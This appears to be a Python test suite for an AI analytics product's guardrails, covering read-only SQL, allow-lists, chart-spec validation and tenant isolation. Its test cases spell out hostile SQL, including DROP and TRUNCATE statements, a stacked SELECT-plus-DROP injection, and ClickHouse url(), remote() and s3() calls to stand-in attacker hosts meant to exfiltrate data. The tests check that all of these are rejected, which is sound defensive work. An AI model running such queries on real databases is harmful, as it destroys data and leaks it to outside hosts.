"""Consolidated AI-guardrail test suite — Phase 4 safety net.

This module is the cross-cutting phase gate.  It asserts the four mandatory
guardrail invariants across EVERY AI surface:

    CAT-1  READ-ONLY ENFORCEMENT
           Generated write/DDL is rejected and run_read_only_query has ZERO
           calls.  Parametrised over DELETE, UPDATE, INSERT, DROP, ALTER,
           TRUNCATE, a stacked SELECT+DROP, and ClickHouse TVFs url()/remote()/
           s3().  Tested at the SERVICE level (mock gateway → bad SQL → mock
           ClickHouse) so generation→validation→(no execution) is proven.

    CAT-2  ALLOW-LIST ENFORCEMENT
           NL→SQL: SELECT from a non-allow-listed table is rejected, execute
           never called.
           NL→Chart: metric_refs or encoding not in Cube meta is rejected,
           semantic query never called.
           Suggestions: suggestion referencing a column absent from the dataset
           profile is dropped.

    CAT-3  CHART-SPEC REJECTION
           Malformed JSON, unknown field, invalid chart type, missing required
           encoding, inline query/dataset_id smuggled, and series field absent
           from metric_refs — each rejected with no Cube query called.

    CAT-4  NO-CROSS-TENANT LEAK
           For EVERY AI path that touches tenant data:
           (a) Two distinct TenantContexts drive scoping to their OWN resources;
               JWT clickhouse_db claims differ per tenant.
           (b) NL→SQL validator rejects a generated ``other_tenant_db.table``
               qualifier so data isolation is structural not trust-based.
           (c) Suggestions resolve the dataset via get_for_tenant(ctx, ...) so a
               dataset not owned by the requesting tenant is never profiled.
           (d) NONE of the service methods accept a tenant id from the request
               body — scope comes only from the server-resolved context.

    CAT-5  NO-INVENTED-NUMBERS (insight summaries)
           A summary whose numbers cannot be traced to the supplied result set
           fails closed (post-generation guardrail) rather than being returned.

Every pre-execution rejection test (CAT-1/2/3) asserts the downstream
side-effect mock ``assert_not_called()`` — a guardrail that rejects but still
executes would be a critical miss.
"""
from __future__ import annotations

import json
import uuid
from decimal import Decimal
from pathlib import Path
from typing import Any
from unittest.mock import AsyncMock, MagicMock

import httpx
import jwt
import pytest
from fastapi import HTTPException
from pydantic import SecretStr

from app.ai.gateway.gateway import LLMGateway
from app.ai.gateway.loader import PromptLoader
from app.ai.gateway.provider import LLMResponse
from app.ai.insights.guardrail import InsightGuardrailError
from app.ai.insights.suggestion_validator import validate_suggestions
from app.ai.insights.suggestions import SuggestionsService
from app.ai.insights.summary import InsightService
from app.ai.nl_chart.service import NLToChartService
from app.ai.nl_chart.validator import ChartValidationError, validate_chart_spec
from app.ai.nl_sql.service import NLToSQLService
from app.ai.nl_sql.validator import SQLValidationError, validate_and_cap
from app.ai.semantic.client import (
    DIM_REGION,
    MEASURE_TOTAL_AMOUNT,
    CubeSettings,
    SemanticLayerClient,
)
from app.core.clickhouse import QueryResult
from app.services.clickhouse_datasets import ClickHouseDatasetService
from app.services.datasets import DatasetService
from app.tenancy.context import TenantContext
from app.tenancy.resources import resources_for_slug

# ---------------------------------------------------------------------------
# Shared fixtures / constants
# ---------------------------------------------------------------------------

_ALLOWED_TABLE = "serving_regional_sales"
_ALLOWED_TABLE_SET: set[str] = {_ALLOWED_TABLE}
_MAX_ROWS = 10_000

_FAKE_META = {
    "cubes": [
        {
            "name": "regional_sales",
            "title": "Regional Sales",
            "measures": [
                {"name": "regional_sales.total_amount", "title": "Total Amount", "type": "sum"},
                {"name": "regional_sales.avg_share", "title": "Avg Share", "type": "avg"},
            ],
            "dimensions": [
                {"name": "regional_sales.region", "title": "Region", "type": "string"},
            ],
        }
    ]
}

_ALLOWED_METRICS = {"regional_sales.total_amount", "regional_sales.avg_share"}
_ALLOWED_DIMS = {"regional_sales.region"}

# A minimal valid chart spec JSON produced by the LLM.
_VALID_CHART_DICT: dict[str, Any] = {
    "version": "1",
    "type": "bar",
    "query": {"metric_refs": ["regional_sales.total_amount"]},
    "encoding": {
        "x": "regional_sales.region",
        "series": [{"field": "regional_sales.total_amount", "name": "Total Amount"}],
    },
    "options": {"title": "Sales", "stacked": False, "show_legend": True},
}

# Test-only dummy values (NOT real infra/secrets). The Cube client is always
# wired to an httpx MockTransport in this suite, so this URL is never resolved
# and this secret only signs/verifies JWTs in-process. Kept off any real
# compose service name so a test can't accidentally talk to a live Cube.
_CUBE_BASE_URL_TEST = "http://cube.test.local:4000"
_CUBE_SECRET_TEST_ONLY = "test-secret-at-least-32-chars-long!"


def _prompts_dir() -> Path:
    return Path(__file__).parent.parent / "app" / "ai" / "prompts"


def _make_ctx(slug: str = "acme") -> TenantContext:
    res = resources_for_slug(slug)
    return TenantContext(
        tenant_id=str(uuid.uuid4()),
        iceberg_namespace=res.iceberg_namespace,
        clickhouse_db=res.clickhouse_db,
        dbt_schema=res.dbt_schema,
    )


def _llm(text: str) -> LLMResponse:
    return LLMResponse(text=text, model="test", usage={"input_tokens": 10, "output_tokens": 10})


def _query_result() -> QueryResult:
    return QueryResult(column_names=["region"], rows=[("EMEA",)])


def _cube_rows() -> list[dict[str, Any]]:
    return [{"regional_sales.region": "EMEA", "regional_sales.total_amount": Decimal("100")}]


# ---------------------------------------------------------------------------
# NL→SQL service factory
# ---------------------------------------------------------------------------


def _nl_sql_service(
    sql: str,
    *,
    allowed_table: str = _ALLOWED_TABLE,
    max_rows: int = _MAX_ROWS,
) -> tuple[NLToSQLService, MagicMock]:
    """Return (service, mock_ch) with the gateway wired to emit ``sql``."""
    loader = PromptLoader(str(_prompts_dir()))

    mock_gateway = MagicMock(spec=LLMGateway)
    mock_gateway.complete = AsyncMock(return_value=_llm(sql))

    mock_semantic = MagicMock(spec=SemanticLayerClient)
    mock_semantic.meta = AsyncMock(return_value=_FAKE_META)

    mock_ch = MagicMock(spec=ClickHouseDatasetService)
    mock_ch.run_read_only_query = MagicMock(return_value=_query_result())

    mock_settings = MagicMock()
    mock_settings.serving_regional_sales_table = allowed_table
    mock_settings.max_query_rows = max_rows

    svc = NLToSQLService(
        gateway=mock_gateway,  # type: ignore[arg-type]
        prompt_loader=loader,
        semantic_client=mock_semantic,  # type: ignore[arg-type]
        ch_dataset_svc=mock_ch,  # type: ignore[arg-type]
        settings=mock_settings,  # type: ignore[arg-type]
    )
    return svc, mock_ch


# ---------------------------------------------------------------------------
# NL→Chart service factory
# ---------------------------------------------------------------------------


def _nl_chart_service(
    raw_output: str,
    *,
    meta: dict[str, Any] | None = None,
) -> tuple[NLToChartService, MagicMock, MagicMock]:
    """Return (service, mock_meta, mock_query)."""
    loader = PromptLoader(str(_prompts_dir()))

    mock_gateway = MagicMock(spec=LLMGateway)
    mock_gateway.complete = AsyncMock(return_value=_llm(raw_output))

    mock_semantic = MagicMock(spec=SemanticLayerClient)
    mock_semantic.meta = AsyncMock(return_value=meta or _FAKE_META)
    mock_semantic.query = AsyncMock(return_value=_cube_rows())

    svc = NLToChartService(
        gateway=mock_gateway,  # type: ignore[arg-type]
        prompt_loader=loader,
        semantic_client=mock_semantic,  # type: ignore[arg-type]
    )
    return svc, mock_semantic.meta, mock_semantic.query


# ---------------------------------------------------------------------------
# Suggestions service factory
# ---------------------------------------------------------------------------


def _dataset(tenant_id: str, dataset_id: uuid.UUID) -> Any:
    from app.models.dataset import Dataset

    ds = MagicMock(spec=Dataset)
    ds.id = dataset_id
    ds.tenant_id = uuid.UUID(tenant_id)
    ds.name = "test.csv"
    return ds


def _suggestions_service(
    llm_output: str,
    *,
    dataset_id: uuid.UUID,
    tenant_id: str,
    columns: list[tuple[str, str]] | None = None,
) -> tuple[SuggestionsService, MagicMock, MagicMock]:
    """Return (service, mock_dataset_svc, mock_ch_svc)."""
    loader = PromptLoader(str(_prompts_dir()))
    cols = columns or [("region", "String"), ("revenue", "Float64")]

    ds = _dataset(tenant_id, dataset_id)
    mock_dataset_svc = MagicMock(spec=DatasetService)
    mock_dataset_svc.get_for_tenant = AsyncMock(return_value=ds)

    mock_gateway = MagicMock(spec=LLMGateway)
    mock_gateway.complete = AsyncMock(return_value=_llm(llm_output))

    mock_ch_svc = MagicMock(spec=ClickHouseDatasetService)

    describe_result = MagicMock()
    describe_result.rows = cols
    count_result = MagicMock()
    count_result.rows = [[500]]
    distinct_result = MagicMock()
    distinct_result.rows = [[5]]
    stats_result = MagicMock()
    stats_result.rows = [[100.0, 5000.0, 2500.0]]
    sample_result = MagicMock()
    sample_result.rows = [["EMEA"], ["APAC"]]

    def _run_query(_ctx: Any, sql: str, **_kw: Any) -> Any:
        if "DESCRIBE" in sql:
            return describe_result
        if "count(*)" in sql.lower():
            return count_result
        if "uniq(" in sql.lower():
            return distinct_result
        if "min(" in sql.lower():
            return stats_result
        return sample_result

    mock_ch_svc.run_read_only_query = MagicMock(side_effect=_run_query)

    svc = SuggestionsService(
        gateway=mock_gateway,  # type: ignore[arg-type]
        prompt_loader=loader,
        dataset_service=mock_dataset_svc,  # type: ignore[arg-type]
        ch_svc=mock_ch_svc,  # type: ignore[arg-type]
    )
    return svc, mock_dataset_svc, mock_ch_svc


# ===========================================================================
# CAT-1: READ-ONLY ENFORCEMENT
# ===========================================================================
# Parametrised over every write/DDL form.  Each test:
#  (a) mocks the gateway to emit the bad SQL
#  (b) asserts SQLValidationError is raised
#  (c) asserts run_read_only_query has ZERO calls
#
# The service-level test proves generation→validation→(no execution).
# ===========================================================================


@pytest.mark.parametrize(
    "bad_sql,label",
    [
        (
            f"DELETE FROM {_ALLOWED_TABLE} WHERE region = 'EMEA'",
            "DELETE",
        ),
        (
            f"UPDATE {_ALLOWED_TABLE} SET total_amount = 0",
            "UPDATE",
        ),
        (
            f"INSERT INTO {_ALLOWED_TABLE} VALUES ('EMEA', 100)",
            "INSERT",
        ),
        (
            f"DROP TABLE {_ALLOWED_TABLE}",
            "DROP",
        ),
        (
            f"ALTER TABLE {_ALLOWED_TABLE} ADD COLUMN foo String",
            "ALTER",
        ),
        (
            f"TRUNCATE TABLE {_ALLOWED_TABLE}",
            "TRUNCATE",
        ),
        (
            # Stacked: valid SELECT followed by destructive DROP
            f"SELECT 1; DROP TABLE {_ALLOWED_TABLE}",
            "stacked_SELECT+DROP",
        ),
        (
            "SELECT * FROM url('http://evil.example.com/exfil', CSV, 'c String') LIMIT 10",
            "TVF_url()",
        ),
        (
            "SELECT * FROM remote('attacker:9000', system, users) LIMIT 10",
            "TVF_remote()",
        ),
        (
            "SELECT * FROM s3('s3://attacker-bucket/data.parquet', 'Parquet') LIMIT 10",
            "TVF_s3()",
        ),
    ],
    ids=[
        "DELETE",
        "UPDATE",
        "INSERT",
        "DROP",
        "ALTER",
        "TRUNCATE",
        "stacked_SELECT+DROP",
        "TVF_url()",
        "TVF_remote()",
        "TVF_s3()",
    ],
)
@pytest.mark.asyncio
async def test_cat1_write_or_tvf_rejected_execute_never_called(
    bad_sql: str, label: str
) -> None:
    """CAT-1: Every write/DDL/TVF is rejected and execute has zero calls (service level)."""
    ctx = _make_ctx()
    svc, mock_ch = _nl_sql_service(bad_sql)

    with pytest.raises(SQLValidationError) as exc_info:
        await svc.query(ctx, question=f"guardrail test: {label}")

    reason = exc_info.value.reason
    assert reason, f"SQLValidationError must carry a non-empty reason for {label!r}"

    assert mock_ch.run_read_only_query.call_count == 0, (
        f"[CAT-1] run_read_only_query was called despite validation failure "
        f"for {label!r} SQL={bad_sql!r}"
    )


@pytest.mark.parametrize(
    "bad_sql,label",
    [
        (f"DELETE FROM {_ALLOWED_TABLE}", "DELETE"),
        (f"UPDATE {_ALLOWED_TABLE} SET x = 1", "UPDATE"),
        (f"INSERT INTO {_ALLOWED_TABLE} VALUES (1)", "INSERT"),
        (f"DROP TABLE {_ALLOWED_TABLE}", "DROP"),
        (f"ALTER TABLE {_ALLOWED_TABLE} RENAME TO other", "ALTER"),
        (f"TRUNCATE TABLE {_ALLOWED_TABLE}", "TRUNCATE"),
        (
            "SELECT * FROM url('http://evil.com/', CSV, 'x String') LIMIT 1",
            "TVF_url()",
        ),
        (
            "SELECT * FROM remote('h:9000', system, users) LIMIT 1",
            "TVF_remote()",
        ),
        (
            "SELECT * FROM s3('s3://bucket/file.parquet', 'Parquet') LIMIT 1",
            "TVF_s3()",
        ),
    ],
    ids=[
        "DELETE",
        "UPDATE",
        "INSERT",
        "DROP",
        "ALTER",
        "TRUNCATE",
        "TVF_url()",
        "TVF_remote()",
        "TVF_s3()",
    ],
)
def test_cat1_direct_validator_raises_on_write_or_tvf(bad_sql: str, label: str) -> None:
    """CAT-1 (validator unit): validate_and_cap raises SQLValidationError for every form."""
    with pytest.raises(SQLValidationError) as exc_info:
        validate_and_cap(
            bad_sql,
            allowed_tables=_ALLOWED_TABLE_SET,
            tenant_db="tenant_acme",
            max_rows=_MAX_ROWS,
        )
    # The reason is part of the public contract (surfaced to the API). Assert it
    # is non-empty so a refactor raising SQLValidationError("") can't pass.
    assert exc_info.value.reason, f"[CAT-1] {label}: rejection must carry a reason"


# ===========================================================================
# CAT-2: ALLOW-LIST ENFORCEMENT
# ===========================================================================


@pytest.mark.asyncio
async def test_cat2_nl_sql_off_allowlist_table_rejected_execute_never_called() -> None:
    """CAT-2 NL→SQL: SELECT from a non-allow-listed table → rejected, execute NEVER called."""
    ctx = _make_ctx()
    svc, mock_ch = _nl_sql_service("SELECT * FROM secrets LIMIT 10")

    with pytest.raises(SQLValidationError) as exc_info:
        await svc.query(ctx, question="show secrets")

    reason = exc_info.value.reason.lower()
    assert "govern" in reason or "semantic" in reason or "secrets" in reason, (
        f"[CAT-2] Unexpected reason: {exc_info.value.reason!r}"
    )
    assert mock_ch.run_read_only_query.call_count == 0, (
        "[CAT-2] run_read_only_query was called despite allow-list violation"
    )


@pytest.mark.asyncio
async def test_cat2_nl_sql_system_table_rejected_execute_never_called() -> None:
    """CAT-2 NL→SQL: SELECT from system.tables → rejected, execute NEVER called."""
    ctx = _make_ctx()
    svc, mock_ch = _nl_sql_service("SELECT * FROM system.tables LIMIT 5")

    with pytest.raises(SQLValidationError):
        await svc.query(ctx, question="list tables")

    assert mock_ch.run_read_only_query.call_count == 0


@pytest.mark.asyncio
async def test_cat2_nl_chart_ungrounded_metric_rejected_query_never_called() -> None:
    """CAT-2 NL→Chart: metric not in Cube meta → rejected, query NEVER called."""
    ctx = _make_ctx()
    bad_spec = {
        **_VALID_CHART_DICT,
        "query": {"metric_refs": ["regional_sales.invented_metric"]},
        "encoding": {
            "x": "regional_sales.region",
            "series": [{"field": "regional_sales.invented_metric", "name": "X"}],
        },
    }
    svc, _, mock_query = _nl_chart_service(json.dumps(bad_spec))

    with pytest.raises(ChartValidationError) as exc_info:
        await svc.generate(ctx, request="show invented metric")

    reason = exc_info.value.reason.lower()
    assert "invented_metric" in reason or "govern" in reason or "semantic" in reason, (
        f"[CAT-2] Unexpected reason: {exc_info.value.reason!r}"
    )
    assert mock_query.call_count == 0, (
        "[CAT-2] SemanticLayerClient.query was called despite ungrounded metric"
    )


@pytest.mark.asyncio
async def test_cat2_nl_chart_ungrounded_dimension_rejected_query_never_called() -> None:
    """CAT-2 NL→Chart: encoding.x not in Cube meta → rejected, query NEVER called."""
    ctx = _make_ctx()
    bad_spec = {
        **_VALID_CHART_DICT,
        "encoding": {
            "x": "regional_sales.not_a_dimension",
            "series": [{"field": "regional_sales.total_amount", "name": "Total"}],
        },
    }
    svc, _, mock_query = _nl_chart_service(json.dumps(bad_spec))

    with pytest.raises(ChartValidationError):
        await svc.generate(ctx, request="show sales by unknown dim")

    assert mock_query.call_count == 0, (
        "[CAT-2] SemanticLayerClient.query was called despite ungrounded dimension"
    )


def test_cat2_suggestions_ungrounded_column_dropped() -> None:
    """CAT-2 Suggestions: column not in dataset profile → suggestion dropped (not returned)."""
    dataset_id = str(uuid.uuid4())
    raw = [
        {
            "title": "Ghost Chart",
            "rationale": "Uses a column that does not exist.",
            "spec": {
                "version": "1",
                "type": "bar",
                "query": {
                    "dataset_id": dataset_id,
                    "query": {
                        "dimensions": ["ghost_col"],
                        "metrics": [{"function": "sum", "column": "revenue", "alias": "total"}],
                        "filters": [],
                        "limit": 1000,
                    },
                },
                "encoding": {
                    "x": "ghost_col",
                    "series": [{"field": "total", "name": "Total"}],
                },
                "options": {"title": None, "stacked": False, "show_legend": True},
            },
        }
    ]
    result = validate_suggestions(
        raw,
        allowed_columns={"region", "revenue"},  # ghost_col is absent
        dataset_id_str=dataset_id,
    )
    assert result == [], (
        "[CAT-2] suggestion referencing ghost_col survived — allow-list not enforced"
    )


def test_cat2_suggestions_ungrounded_metric_column_dropped() -> None:
    """CAT-2 Suggestions: metric column not in dataset profile → suggestion dropped."""
    dataset_id = str(uuid.uuid4())
    raw = [
        {
            "title": "Bad Metric Chart",
            "rationale": "Uses non-existent metric column.",
            "spec": {
                "version": "1",
                "type": "bar",
                "query": {
                    "dataset_id": dataset_id,
                    "query": {
                        "dimensions": ["region"],
                        "metrics": [
                            {"function": "sum", "column": "fake_col", "alias": "total"}
                        ],
                        "filters": [],
                        "limit": 1000,
                    },
                },
                "encoding": {
                    "x": "region",
                    "series": [{"field": "total", "name": "Total"}],
                },
                "options": {"title": None, "stacked": False, "show_legend": True},
            },
        }
    ]
    result = validate_suggestions(
        raw,
        allowed_columns={"region", "revenue"},  # fake_col absent
        dataset_id_str=dataset_id,
    )
    assert result == [], "[CAT-2] suggestion with fake metric column survived"


# ===========================================================================
# CAT-3: CHART-SPEC REJECTION
# ===========================================================================


@pytest.mark.parametrize(
    "raw_output,label",
    [
        # 1. Malformed JSON
        ("not valid json {{{", "malformed_json"),
        # 2. Unknown/extra field
        (json.dumps({**_VALID_CHART_DICT, "evil_field": "injected"}), "extra_field"),
        # 3. Invalid chart type
        (json.dumps({**_VALID_CHART_DICT, "type": "heatmap"}), "invalid_chart_type"),
        # 4. Missing required encoding.x for an axis chart (bar without x)
        (
            json.dumps(
                {
                    "version": "1",
                    "type": "bar",
                    "query": {"metric_refs": ["regional_sales.total_amount"]},
                    "encoding": {
                        "series": [
                            {"field": "regional_sales.total_amount", "name": "Total"}
                        ],
                    },
                    "options": {"title": None, "stacked": False, "show_legend": True},
                }
            ),
            "missing_encoding_x",
        ),
        # 5. Inline query smuggled (query.query)
        (
            json.dumps(
                {
                    "version": "1",
                    "type": "bar",
                    "query": {
                        "query": {
                            "dimensions": ["region"],
                            "metrics": [
                                {"function": "sum", "column": "amount", "alias": "total"}
                            ],
                        },
                        "metric_refs": [],
                    },
                    "encoding": {
                        "x": "regional_sales.region",
                        "series": [
                            {"field": "regional_sales.total_amount", "name": "Total"}
                        ],
                    },
                    "options": {"title": None, "stacked": False, "show_legend": True},
                }
            ),
            "inline_query_smuggled",
        ),
        # 6. dataset_id smuggled alongside valid metric_refs
        (
            json.dumps(
                {
                    **_VALID_CHART_DICT,
                    "query": {
                        "dataset_id": "00000000-0000-0000-0000-000000000001",
                        "metric_refs": ["regional_sales.total_amount"],
                    },
                }
            ),
            "dataset_id_smuggled",
        ),
        # 7. series field absent from metric_refs (grounded metric but wrong alignment)
        (
            json.dumps(
                {
                    "version": "1",
                    "type": "bar",
                    "query": {"metric_refs": ["regional_sales.total_amount"]},
                    "encoding": {
                        "x": "regional_sales.region",
                        # avg_share is governed but NOT in metric_refs
                        "series": [
                            {"field": "regional_sales.avg_share", "name": "Avg Share"}
                        ],
                    },
                    "options": {"title": None, "stacked": False, "show_legend": True},
                }
            ),
            "series_field_not_in_metric_refs",
        ),
        # 8. Empty series list
        (
            json.dumps(
                {
                    "version": "1",
                    "type": "bar",
                    "query": {"metric_refs": ["regional_sales.total_amount"]},
                    "encoding": {
                        "x": "regional_sales.region",
                        "series": [],
                    },
                    "options": {"title": None, "stacked": False, "show_legend": True},
                }
            ),
            "empty_series",
        ),
    ],
    ids=[
        "malformed_json",
        "extra_field",
        "invalid_chart_type",
        "missing_encoding_x",
        "inline_query_smuggled",
        "dataset_id_smuggled",
        "series_field_not_in_metric_refs",
        "empty_series",
    ],
)
@pytest.mark.asyncio
async def test_cat3_chart_spec_rejection_query_never_called(
    raw_output: str, label: str
) -> None:
    """CAT-3: Each invalid chart spec variant is rejected; Cube query NEVER called."""
    ctx = _make_ctx()
    svc, _, mock_query = _nl_chart_service(raw_output)

    with pytest.raises(ChartValidationError):
        await svc.generate(ctx, request=f"test {label}")

    assert mock_query.call_count == 0, (
        f"[CAT-3] SemanticLayerClient.query was called despite spec rejection "
        f"for {label!r}"
    )


@pytest.mark.parametrize(
    "raw_output,label",
    [
        ("not valid json {{{", "malformed_json"),
        (json.dumps({**_VALID_CHART_DICT, "evil_field": "injected"}), "extra_field"),
        (json.dumps({**_VALID_CHART_DICT, "type": "sankey"}), "invalid_type"),
        (
            json.dumps(
                {
                    "version": "1",
                    "type": "bar",
                    "query": {"metric_refs": ["regional_sales.total_amount"]},
                    "encoding": {
                        "series": [{"field": "regional_sales.total_amount"}],
                    },
                    "options": {"title": None, "stacked": False, "show_legend": True},
                }
            ),
            "missing_x",
        ),
        (
            json.dumps(
                {
                    **_VALID_CHART_DICT,
                    "query": {
                        "dataset_id": "00000000-0000-0000-0000-000000000002",
                        "metric_refs": ["regional_sales.total_amount"],
                    },
                }
            ),
            "dataset_id_smuggled",
        ),
        (
            json.dumps(
                {
                    **_VALID_CHART_DICT,
                    "query": {"metric_refs": ["regional_sales.total_amount"]},
                    "encoding": {
                        "x": "regional_sales.region",
                        # grounded metric, but NOT listed in metric_refs → would
                        # resolve to null data; must be rejected.
                        "series": [{"field": "regional_sales.avg_share"}],
                    },
                }
            ),
            "series_not_in_metric_refs",
        ),
        (
            json.dumps(
                {
                    **_VALID_CHART_DICT,
                    "encoding": {"x": "regional_sales.region", "series": []},
                }
            ),
            "empty_series",
        ),
    ],
    ids=[
        "malformed_json",
        "extra_field",
        "invalid_type",
        "missing_x",
        "dataset_id_smuggled",
        "series_not_in_metric_refs",
        "empty_series",
    ],
)
def test_cat3_direct_validator_rejects_bad_spec(raw_output: str, label: str) -> None:
    """CAT-3 (direct): validate_chart_spec raises ChartValidationError for each variant."""
    with pytest.raises(ChartValidationError) as exc_info:
        validate_chart_spec(
            raw_output,
            allowed_metrics=_ALLOWED_METRICS,
            allowed_dimensions=_ALLOWED_DIMS,
        )
    assert exc_info.value.reason, f"[CAT-3] {label}: rejection must carry a reason"


# ===========================================================================
# CAT-4: NO-CROSS-TENANT LEAK
# ===========================================================================
# (a) JWT clickhouse_db claims differ per tenant (semantic client)
# (b) NL→SQL validator rejects cross-tenant DB qualifier
# (c) NL→Chart: each tenant's grounding uses its own meta call
# (d) Suggestions: get_for_tenant called with server-resolved ctx; dataset
#     not owned by tenant → 404, no profiling
# (e) Insights: gateway called with server-resolved ctx, no bleed
# ===========================================================================


# ---------------------------------------------------------------------------
# (a) Semantic client — JWTs are tenant-scoped
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_cat4_semantic_client_jwt_db_differs_per_tenant() -> None:
    """CAT-4 Semantic: JWTs for two tenants carry DIFFERENT clickhouse_db claims."""
    captured_a: list[httpx.Request] = []
    captured_b: list[httpx.Request] = []

    def _handler_a(req: httpx.Request) -> httpx.Response:
        captured_a.append(req)
        return httpx.Response(200, json={"data": []})

    def _handler_b(req: httpx.Request) -> httpx.Response:
        captured_b.append(req)
        return httpx.Response(200, json={"data": []})

    cube_cfg = MagicMock(spec=CubeSettings)
    cube_cfg.base_url = _CUBE_BASE_URL_TEST
    cube_cfg.api_secret = SecretStr(_CUBE_SECRET_TEST_ONLY)

    client_a = SemanticLayerClient(
        cube_settings=cube_cfg,
        http_client=httpx.AsyncClient(transport=httpx.MockTransport(_handler_a)),
    )
    client_b = SemanticLayerClient(
        cube_settings=cube_cfg,
        http_client=httpx.AsyncClient(transport=httpx.MockTransport(_handler_b)),
    )

    ctx_a = _make_ctx("alpha")
    ctx_b = _make_ctx("betacorp")

    await client_a.query(ctx_a, measures=[MEASURE_TOTAL_AMOUNT], dimensions=[DIM_REGION])
    await client_b.query(ctx_b, measures=[MEASURE_TOTAL_AMOUNT], dimensions=[DIM_REGION])

    token_a = captured_a[0].headers["authorization"].split(" ", 1)[1]
    token_b = captured_b[0].headers["authorization"].split(" ", 1)[1]

    decoded_a = jwt.decode(token_a, _CUBE_SECRET_TEST_ONLY, algorithms=["HS256"])
    decoded_b = jwt.decode(token_b, _CUBE_SECRET_TEST_ONLY, algorithms=["HS256"])

    assert decoded_a["clickhouse_db"] != decoded_b["clickhouse_db"], \
        "[CAT-4] JWTs for different tenants must carry DIFFERENT clickhouse_db claims"
    assert decoded_a["clickhouse_db"] == ctx_a.clickhouse_db, \
        f"[CAT-4] JWT for tenant_a must carry {ctx_a.clickhouse_db!r}"
    assert decoded_b["clickhouse_db"] == ctx_b.clickhouse_db, \
        f"[CAT-4] JWT for tenant_b must carry {ctx_b.clickhouse_db!r}"


@pytest.mark.asyncio
async def test_cat4_semantic_meta_jwt_db_differs_per_tenant() -> None:
    """CAT-4 Semantic meta: meta() also mints per-tenant JWTs — claims differ."""
    captured_a: list[httpx.Request] = []
    captured_b: list[httpx.Request] = []

    fake_meta = json.dumps({"cubes": []}).encode()

    def _handler_a(req: httpx.Request) -> httpx.Response:
        captured_a.append(req)
        return httpx.Response(200, content=fake_meta)

    def _handler_b(req: httpx.Request) -> httpx.Response:
        captured_b.append(req)
        return httpx.Response(200, content=fake_meta)

    cube_cfg = MagicMock(spec=CubeSettings)
    cube_cfg.base_url = _CUBE_BASE_URL_TEST
    cube_cfg.api_secret = SecretStr(_CUBE_SECRET_TEST_ONLY)

    client_a = SemanticLayerClient(
        cube_settings=cube_cfg,
        http_client=httpx.AsyncClient(transport=httpx.MockTransport(_handler_a)),
    )
    client_b = SemanticLayerClient(
        cube_settings=cube_cfg,
        http_client=httpx.AsyncClient(transport=httpx.MockTransport(_handler_b)),
    )

    ctx_a = _make_ctx("gamma")
    ctx_b = _make_ctx("deltaorg")

    await client_a.meta(ctx_a)
    await client_b.meta(ctx_b)

    token_a = captured_a[0].headers["authorization"].split(" ", 1)[1]
    token_b = captured_b[0].headers["authorization"].split(" ", 1)[1]

    decoded_a = jwt.decode(token_a, _CUBE_SECRET_TEST_ONLY, algorithms=["HS256"])
    decoded_b = jwt.decode(token_b, _CUBE_SECRET_TEST_ONLY, algorithms=["HS256"])

    assert decoded_a["clickhouse_db"] != decoded_b["clickhouse_db"], \
        "[CAT-4] meta() must mint different JWTs for different tenants"


# ---------------------------------------------------------------------------
# (b) NL→SQL: cross-tenant DB qualifier in generated SQL is rejected
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_cat4_nl_sql_cross_tenant_db_qualifier_rejected() -> None:
    """CAT-4 NL→SQL: an LLM-emitted other_tenant_db.table is rejected even if table is allowed."""
    ctx = _make_ctx("acme")  # clickhouse_db = "tenant_acme"
    # LLM emits a cross-tenant qualified reference
    bad_sql = f"SELECT region FROM tenant_other.{_ALLOWED_TABLE} LIMIT 10"
    svc, mock_ch = _nl_sql_service(bad_sql)

    with pytest.raises(SQLValidationError) as exc_info:
        await svc.query(ctx, question="cross-tenant query attempt")

    reason = exc_info.value.reason.lower()
    assert "tenant" in reason or "cross" in reason or "database" in reason, \
        f"[CAT-4] Expected tenancy-related rejection reason, got: {exc_info.value.reason!r}"
    assert mock_ch.run_read_only_query.call_count == 0, \
        "[CAT-4] run_read_only_query must never be called after cross-tenant rejection"


def test_cat4_nl_sql_direct_validator_cross_tenant_db_qualifier_rejected() -> None:
    """CAT-4 NL→SQL (direct): validate_and_cap rejects a cross-tenant DB qualifier."""
    sql = f"SELECT region FROM tenant_other.{_ALLOWED_TABLE} LIMIT 10"
    with pytest.raises(SQLValidationError) as exc_info:
        validate_and_cap(
            sql,
            allowed_tables=_ALLOWED_TABLE_SET,
            tenant_db="tenant_acme",
            max_rows=_MAX_ROWS,
        )
    reason = exc_info.value.reason.lower()
    assert "tenant" in reason or "cross" in reason or "database" in reason


@pytest.mark.asyncio
async def test_cat4_nl_sql_two_tenants_grounding_uses_own_clickhouse_db() -> None:
    """CAT-4 NL→SQL: meta() is called separately for each tenant with correct context."""
    ctx_a = _make_ctx("alpha")
    ctx_b = _make_ctx("betacorp")

    meta_calls: list[TenantContext] = []

    async def _meta_side(ctx: TenantContext) -> dict[str, Any]:
        meta_calls.append(ctx)
        return _FAKE_META

    loader = PromptLoader(str(_prompts_dir()))
    mock_gateway = MagicMock(spec=LLMGateway)
    mock_gateway.complete = AsyncMock(
        return_value=_llm(f"SELECT region FROM {_ALLOWED_TABLE} LIMIT 10")
    )
    mock_semantic = MagicMock(spec=SemanticLayerClient)
    mock_semantic.meta = AsyncMock(side_effect=_meta_side)
    mock_ch = MagicMock(spec=ClickHouseDatasetService)
    mock_ch.run_read_only_query = MagicMock(return_value=_query_result())
    mock_settings = MagicMock()
    mock_settings.serving_regional_sales_table = _ALLOWED_TABLE
    mock_settings.max_query_rows = _MAX_ROWS

    svc = NLToSQLService(
        gateway=mock_gateway,  # type: ignore[arg-type]
        prompt_loader=loader,
        semantic_client=mock_semantic,  # type: ignore[arg-type]
        ch_dataset_svc=mock_ch,  # type: ignore[arg-type]
        settings=mock_settings,  # type: ignore[arg-type]
    )

    await svc.query(ctx_a, question="Show regions")
    await svc.query(ctx_b, question="Show regions")

    assert len(meta_calls) == 2, "[CAT-4] meta() must be called once per tenant"
    assert meta_calls[0].tenant_id == ctx_a.tenant_id
    assert meta_calls[1].tenant_id == ctx_b.tenant_id
    assert meta_calls[0].clickhouse_db != meta_calls[1].clickhouse_db, \
        "[CAT-4] NL-SQL: the two tenants must have DIFFERENT clickhouse_db values"


# ---------------------------------------------------------------------------
# (c) NL→Chart: two tenants — each meta/query call carries its own context
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_cat4_nl_chart_two_tenants_own_meta_calls() -> None:
    """CAT-4 NL→Chart: meta() is called with each tenant's context independently."""
    ctx_a = _make_ctx("alpha")
    ctx_b = _make_ctx("betacorp")

    meta_calls: list[TenantContext] = []

